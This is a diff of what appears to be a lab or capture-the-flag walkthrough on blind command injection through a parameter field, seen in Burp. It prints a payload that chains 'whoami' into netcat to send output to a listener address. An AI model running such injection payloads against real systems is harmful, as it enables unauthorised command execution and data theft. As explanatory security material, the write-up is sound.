@@ -31,7 +31,7 @@ the burp request shows the contents of the file and the parameter selected
 we try injecting code in the txt file we upload but it doesn't execute 
 We then try injecting in the parameter field.
 
-below is the payload used in the parameter field
+below is the payload used in the parameter field, Because this is blind command injection we can't see the o/p so we grep nc with the payload
 ```sh
 bytebuster ; whoami | nc 10.17.117.61 4444; 
 ```
